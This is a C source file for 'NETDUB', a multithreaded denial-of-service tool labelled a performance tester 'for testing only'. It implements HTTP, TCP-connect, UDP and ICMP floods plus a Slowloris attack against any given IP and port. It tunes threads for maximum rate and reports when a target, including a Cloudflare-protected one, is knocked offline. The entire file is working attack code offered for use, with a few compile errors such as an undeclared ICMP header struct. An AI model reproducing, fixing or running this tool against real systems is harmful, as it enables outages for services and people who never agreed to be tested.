#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sched.h>
#include <netdb.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define MAX_THREADS 10000
#define MAX_CONNECTIONS_PER_THREAD 10000
#define BUFFER_SIZE 65536
#define EPOLL_EVENTS 1000
#define MAX_EVENTS 10000

typedef struct {
    char method[16];
    char path[256];
    char host[256];
    char user_agent[512];
    char payload[8192];
    int payload_size;
} http_config_t;

typedef struct {
    long total_packets;
    long successful_connections;
    long failed_connections;
    long bytes_sent;
    long bytes_received;
    double start_time;
    double end_time;
    int active_connections;
    long http_responses[600];
    long layer_stats[10];
} attack_stats_t;

typedef struct {
    int thread_id;
    char target_ip[64];
    int target_port;
    int attack_type;
    int intensity;
    int duration;
    attack_stats_t *stats;
    pthread_mutex_t *stats_mutex;
    volatile int *running;
    http_config_t *http_config;
    int cpu_core;
} thread_config_t;

static volatile int system_running = 1;
static attack_stats_t global_stats = {0};
static pthread_mutex_t global_mutex = PTHREAD_MUTEX_INITIALIZER;

double get_time() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1000000000.0;
}

void signal_handler(int sig) {
    system_running = 0;
    printf("\n[NETDUB] Terminating attack sequence...\n");
}

void set_cpu_affinity(int core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void optimize_socket(int sockfd) {
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    struct linger linger_opt = {1, 0};
    setsockopt(sockfd, SOL_SOCKET, SO_LINGER, &linger_opt, sizeof(linger_opt));
    
    int tcp_nodelay = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &tcp_nodelay, sizeof(tcp_nodelay));
    
    int sndbuf = 65536;
    int rcvbuf = 65536;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
}

int create_raw_socket() {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        return -1;
    }
    
    int opt = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    
    return sockfd;
}

void layer7_http_flood(thread_config_t *config) {
    int epollfd = epoll_create1(0);
    struct epoll_event ev, events[EPOLL_EVENTS];
    struct sockaddr_in server_addr;
    char request_buffer[BUFFER_SIZE];
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config->target_port);
    inet_pton(AF_INET, config->target_ip, &server_addr.sin_addr);
    
    snprintf(request_buffer, sizeof(request_buffer),
        "%s %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: keep-alive\r\n"
        "Accept: */*\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "\r\n%s",
        config->http_config->method,
        config->http_config->path,
        config->http_config->host,
        config->http_config->user_agent,
        config->http_config->payload
    );
    
    int connections_per_batch = config->intensity;
    double start_time = get_time();
    
    while (system_running && (get_time() - start_time) < config->duration) {
        for (int i = 0; i < connections_per_batch && system_running; i++) {
            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (sockfd < 0) continue;
            
            optimize_socket(sockfd);
            fcntl(sockfd, F_SETFL, O_NONBLOCK);
            
            int result = connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
            
            if (result == 0 || errno == EINPROGRESS) {
                ev.events = EPOLLOUT | EPOLLIN | EPOLLET;
                ev.data.fd = sockfd;
                epoll_ctl(epollfd, EPOLL_CTL_ADD, &ev, NULL);
                
                pthread_mutex_lock(config->stats_mutex);
                config->stats->active_connections++;
                pthread_mutex_unlock(config->stats_mutex);
            } else {
                close(sockfd);
                pthread_mutex_lock(config->stats_mutex);
                config->stats->failed_connections++;
                pthread_mutex_unlock(config->stats_mutex);
            }
        }
        
        int nfds = epoll_wait(epollfd, events, EPOLL_EVENTS, 1);
        for (int i = 0; i < nfds; i++) {
            int fd = events[i].data.fd;
            
            if (events[i].events & EPOLLOUT) {
                ssize_t sent = send(fd, request_buffer, strlen(request_buffer), MSG_NOSIGNAL);
                if (sent > 0) {
                    pthread_mutex_lock(config->stats_mutex);
                    config->stats->bytes_sent += sent;
                    config->stats->total_packets++;
                    config->stats->layer_stats[7]++;
                    pthread_mutex_unlock(config->stats_mutex);
                }
            }
            
            if (events[i].events & EPOLLIN) {
                char response[BUFFER_SIZE];
                ssize_t received = recv(fd, response, sizeof(response), MSG_NOSIGNAL);
                if (received > 0) {
                    pthread_mutex_lock(config->stats_mutex);
                    config->stats->bytes_received += received;
                    config->stats->successful_connections++;
                    
                    if (strstr(response, "HTTP/1.") != NULL) {
                        char *status_line = strstr(response, "HTTP/1.");
                        if (status_line) {
                            int status_code = 0;
                            sscanf(status_line, "HTTP/1.%*d %d", &status_code);
                            if (status_code > 0 && status_code < 600) {
                                config->stats->http_responses[status_code]++;
                            }
                        }
                    }
                    pthread_mutex_unlock(config->stats_mutex);
                }
            }
            
            if (events[i].events & (EPOLLHUP | EPOLLERR)) {
                epoll_ctl(epollfd, EPOLL_CTL_DEL, fd, NULL);
                close(fd);
                pthread_mutex_lock(config->stats_mutex);
                config->stats->active_connections--;
                pthread_mutex_unlock(config->stats_mutex);
            }
        }
        
        usleep(1000);
    }
    
    close(epollfd);
}

void layer4_tcp_flood(thread_config_t *config) {
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(config->target_port);
    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
    
    double start_time = get_time();
    
    while (system_running && (get_time() - start_time) < config->duration) {
        for (int i = 0; i < config->intensity && system_running; i++) {
            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (sockfd < 0) continue;
            
            optimize_socket(sockfd);
            fcntl(sockfd, F_SETFL, O_NONBLOCK);
            
            int result = connect(sockfd, (struct sockaddr*)&target, sizeof(target));
            
            if (result == 0 || errno == EINPROGRESS) {
                char data[] = "A";
                send(sockfd, data, sizeof(data), MSG_NOSIGNAL);
                
                pthread_mutex_lock(config->stats_mutex);
                config->stats->successful_connections++;
                config->stats->total_packets++;
                config->stats->layer_stats[4]++;
                pthread_mutex_unlock(config->stats_mutex);
            } else {
                pthread_mutex_lock(config->stats_mutex);
                config->stats->failed_connections++;
                pthread_mutex_unlock(config->stats_mutex);
            }
            
            close(sockfd);
        }
        usleep(100);
    }
}

void layer4_udp_flood(thread_config_t *config) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return;
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(config->target_port);
    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
    
    char payload[1024];
    memset(payload, 'X', sizeof(payload));
    
    double start_time = get_time();
    
    while (system_running && (get_time() - start_time) < config->duration) {
        for (int i = 0; i < config->intensity && system_running; i++) {
            ssize_t sent = sendto(sockfd, payload, sizeof(payload), 0, 
                                (struct sockaddr*)&target, sizeof(target));
            
            pthread_mutex_lock(config->stats_mutex);
            if (sent > 0) {
                config->stats->bytes_sent += sent;
                config->stats->successful_connections++;
                config->stats->total_packets++;
                config->stats->layer_stats[4]++;
            } else {
                config->stats->failed_connections++;
            }
            pthread_mutex_unlock(config->stats_mutex);
        }
        usleep(100);
    }
    
    close(sockfd);
}

void layer3_icmp_flood(thread_config_t *config) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) return;
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
    
    char packet[1024];
    struct icmphdr *icmp = (struct icmphdr*)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = getpid();
    
    double start_time = get_time();
    
    while (system_running && (get_time() - start_time) < config->duration) {
        for (int i = 0; i < config->intensity && system_running; i++) {
            icmp->un.echo.sequence = i;
            icmp->checksum = 0;
            
            ssize_t sent = sendto(sockfd, packet, sizeof(packet), 0,
                                (struct sockaddr*)&target, sizeof(target));
            
            pthread_mutex_lock(config->stats_mutex);
            if (sent > 0) {
                config->stats->bytes_sent += sent;
                config->stats->successful_connections++;
                config->stats->total_packets++;
                config->stats->layer_stats[3]++;
            } else {
                config->stats->failed_connections++;
            }
            pthread_mutex_unlock(config->stats_mutex);
        }
        usleep(1000);
    }
    
    close(sockfd);
}

void slowloris_attack(thread_config_t *config) {
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(config->target_port);
    inet_pton(AF_INET, config->target_ip, &target.sin_addr);
    
    int sockets[1000];
    int socket_count = 0;
    
    double start_time = get_time();
    double last_header_time = start_time;
    
    while (system_running && (get_time() - start_time) < config->duration) {
        if (socket_count < config->intensity) {
            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
            if (sockfd >= 0) {
                optimize_socket(sockfd);
                fcntl(sockfd, F_SETFL, O_NONBLOCK);
                
                if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) == 0 || 
                    errno == EINPROGRESS) {
                    
                    char initial_request[] = "GET / HTTP/1.1\r\nHost: target\r\n";
                    send(sockfd, initial_request, strlen(initial_request), MSG_NOSIGNAL);
                    
                    sockets[socket_count++] = sockfd;
                    
                    pthread_mutex_lock(config->stats_mutex);
                    config->stats->successful_connections++;
                    config->stats->total_packets++;
                    config->stats->layer_stats[7]++;
                    pthread_mutex_unlock(config->stats_mutex);
                } else {
                    close(sockfd);
                }
            }
        }
        
        if (get_time() - last_header_time > 10.0) {
            for (int i = 0; i < socket_count; i++) {
                char header[] = "X-Custom-Header: value\r\n";
                if (send(sockets[i], header, strlen(header), MSG_NOSIGNAL) <= 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--socket_count];
                    i--;
                } else {
                    pthread_mutex_lock(config->stats_mutex);
                    config->stats->bytes_sent += strlen(header);
                    pthread_mutex_unlock(config->stats_mutex);
                }
            }
            last_header_time = get_time();
        }
        
        usleep(100000);
    }
    
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
}

void *attack_thread(void *arg) {
    thread_config_t *config = (thread_config_t*)arg;
    
    set_cpu_affinity(config->cpu_core);
    
    struct sched_param param;
    param.sched_priority = 99;
    sched_setscheduler(0, SCHED_FIFO, &param);
    
    printf("[NETDUB] Thread %d started on core %d - Attack type: %d\n", 
           config->thread_id, config->cpu_core, config->attack_type);
    
    switch (config->attack_type) {
        case 1:
            layer7_http_flood(config);
            break;
        case 2:
            layer4_tcp_flood(config);
            break;
        case 3:
            layer4_udp_flood(config);
            break;
        case 4:
            layer3_icmp_flood(config);
            break;
        case 5:
            slowloris_attack(config);
            break;
        default:
            layer7_http_flood(config);
            break;
    }
    
    printf("[NETDUB] Thread %d completed\n", config->thread_id);
    return NULL;
}

void print_banner() {
    printf("\n");
    printf("███╗   ██╗███████╗████████╗██████╗ ██╗   ██╗██████╗ \n");
    printf("████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║   ██║██╔══██╗\n");
    printf("██╔██╗ ██║█████╗     ██║   ██║  ██║██║   ██║██████╔╝\n");
    printf("██║╚██╗██║██╔══╝     ██║   ██║  ██║██║   ██║██╔══██╗\n");
    printf("██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝██████╔╝\n");
    printf("╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═════╝ \n");
    printf("\n        ULTIMATE ROOT PERFORMANCE TESTER\n");
    printf("               ⚠️  FOR TESTING ONLY  ⚠️\n\n");
}

void print_results(attack_stats_t *stats, int duration, int total_threads) {
    double total_time = stats->end_time - stats->start_time;
    double pps = stats->total_packets / total_time;
    double mbps = (stats->bytes_sent * 8.0) / (total_time * 1000000.0);
    
    printf("\n" "████████████████████████████████████████████████████████████████\n");
    printf("                        NETDUB FINAL RESULTS\n");
    printf("████████████████████████████████████████████████████████████████\n");
    
    printf("Test Duration: %.2f seconds\n", total_time);
    printf("Total Threads: %d\n", total_threads);
    printf("Total Packets: %ld\n", stats->total_packets);
    printf("Packets Per Second: %.2f PPS\n", pps);
    printf("Bandwidth Used: %.2f Mbps\n", mbps);
    printf("Bytes Sent: %ld bytes\n", stats->bytes_sent);
    printf("Bytes Received: %ld bytes\n", stats->bytes_received);
    printf("Successful Connections: %ld\n", stats->successful_connections);
    printf("Failed Connections: %ld\n", stats->failed_connections);
    printf("Active Connections: %d\n", stats->active_connections);
    
    printf("\nLayer Statistics:\n");
    printf("Layer 3 (ICMP): %ld packets\n", stats->layer_stats[3]);
    printf("Layer 4 (TCP/UDP): %ld packets\n", stats->layer_stats[4]);
    printf("Layer 7 (HTTP): %ld packets\n", stats->layer_stats[7]);
    
    printf("\nHTTP Response Codes:\n");
    for (int i = 100; i < 600; i++) {
        if (stats->http_responses[i] > 0) {
            printf("  %d: %ld responses", i, stats->http_responses[i]);
            if (i == 522) printf(" (Cloudflare Timeout)");
            if (i == 503) printf(" (Service Unavailable)");
            if (i == 429) printf(" (Rate Limited)");
            printf("\n");
        }
    }
    
    printf("\n████████████████████████████████████████████████████████████████\n");
    printf("                     TARGET ANALYSIS\n");
    printf("████████████████████████████████████████████████████████████████\n");
    
    double success_rate = (stats->total_packets > 0) ? 
                         (stats->successful_connections * 100.0 / stats->total_packets) : 0;
    
    if (success_rate > 90) {
        printf("[STATUS] TARGET SURVIVED - Server is well protected\n");
        printf("  • Implement rate limiting\n");
        printf("  • Add DDoS protection (Cloudflare, etc.)\n");
        printf("  • Optimize server configuration\n");
    } else if (success_rate > 50) {
        printf("[STATUS] TARGET STRUGGLING - Partial service degradation\n");
        printf("  • Server resources at limit\n");
        printf("  • Need better load balancing\n");
        printf("  • Consider CDN implementation\n");
    } else {
        printf("[STATUS] TARGET COMPROMISED - Service likely unavailable\n");
        printf("  • Critical: Implement DDoS protection immediately\n");
        printf("  • Increase server capacity\n");
        printf("  • Review network architecture\n");
    }
    
    if (stats->http_responses[522] > 0) {
        printf("\n[DETECTED] Cloudflare protection active\n");
        printf("  • Connection timeouts detected\n");
        printf("  • Rate limiting in effect\n");
    }
    
    if (stats->http_responses[503] > 0) {
        printf("\n[DETECTED] Server overload condition\n");
        printf("  • Service unavailable responses\n");
        printf("  • Backend servers down\n");
    }
    
    printf("\n████████████████████████████████████████████████████████████████\n");
}

void print_usage(const char *program) {
    printf("Usage: %s <target_ip> <target_port> [options]\n", program);
    printf("\nAttack Types:\n");
    printf("  1 - Layer 7 HTTP Flood (Default)\n");
    printf("  2 - Layer 4 TCP SYN Flood\n");
    printf("  3 - Layer 4 UDP Flood\n");
    printf("  4 - Layer 3 ICMP Flood\n");
    printf("  5 - Slowloris Attack\n");
    printf("\nOptions:\n");
    printf("  -t <threads>    Number of threads (1-%d)\n", MAX_THREADS);
    printf("  -i <intensity>  Attack intensity per thread\n");
    printf("  -d <duration>   Test duration in seconds\n");
    printf("  -a <type>       Attack type (1-5)\n");
    printf("  -m <method>     HTTP method (GET/POST/PUT)\n");
    printf("  -p <path>       URL path\n");
    printf("  -h <host>       Host header\n");
    printf("\nExample:\n");
    printf("  %s 192.168.1.1 80 -t 1000 -i 1000 -d 60 -a 1\n", program);
}

int main(int argc, char *argv[]) {
    if (getuid() != 0) {
        printf("[ERROR] This tool requires root privileges\n");
        return 1;
    }
    
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }
    
    print_banner();
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = 100;
    int intensity = 1000;
    int duration = 60;
    int attack_type = 1;
    
    http_config_t http_config = {
        .method = "GET",
        .path = "/",
        .host = target_ip,
        .user_agent = "NetDub/1.0 Ultimate Tester",
        .payload = "",
        .payload_size = 0
    };
    
    for (int i = 3; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            num_threads = atoi(argv[++i]);
            if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
        } else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            intensity = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-a") == 0 && i + 1 < argc) {
            attack_type = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            strncpy(http_config.method, argv[++i], sizeof(http_config.method) - 1);
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            strncpy(http_config.path, argv[++i], sizeof(http_config.path) - 1);
        } else if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) {
            strncpy(http_config.host, argv[++i], sizeof(http_config.host) - 1);
        }
    }
    
    struct rlimit rlim;
    rlim.rlim_cur = 1000000;
    rlim.rlim_max = 1000000;
    setrlimit(RLIMIT_NOFILE, &rlim);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    printf("[NETDUB] Target: %s:%d\n", target_ip, target_port);
    printf("[NETDUB] Threads: %d\n", num_threads);
    printf("[NETDUB] Intensity: %d per thread\n", intensity);
    printf("[NETDUB] Duration: %d seconds\n", duration);
    printf("[NETDUB] Attack Type: %d\n", attack_type);
    printf("[NETDUB] Expected PPS: %d\n", num_threads * intensity);
    printf("\n[WARNING] Starting attack in 3 seconds...\n");
    
    sleep(3);
    
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    thread_config_t *configs = malloc(num_threads * sizeof(thread_config_t));
    
    memset(&global_stats, 0, sizeof(attack_stats_t));
    global_stats.start_time = get_time();
    
    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    
    for (int i = 0; i < num_threads; i++) {
        configs[i].thread_id = i;
        strncpy(configs[i].target_ip, target_ip, sizeof(configs[i].target_ip) - 1);
        configs[i].target_port = target_port;
        configs[i].attack_type = attack_type;
        configs[i].intensity = intensity;
        configs[i].duration = duration;
        configs[i].stats = &global_stats;
        configs[i].stats_mutex = &global_mutex;
        configs[i].running = &system_running;
        configs[i].http_config = &http_config;
        configs[i].cpu_core = i % cpu_cores;
        
        if (pthread_create(&threads[i], NULL, attack_thread, &configs[i]) != 0) {
            printf("[ERROR] Failed to create thread %d\n", i);
            num_threads = i;
            break;
        }
    }
    
    printf("[NETDUB] %d attack threads launched\n", num_threads);
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    global_stats.end_time = get_time();
    
    print_results(&global_stats, duration, num_threads);
    
    free(threads);
    free(configs);
    
    printf("\n[NETDUB] Attack sequence completed\n");
    return 0;
}
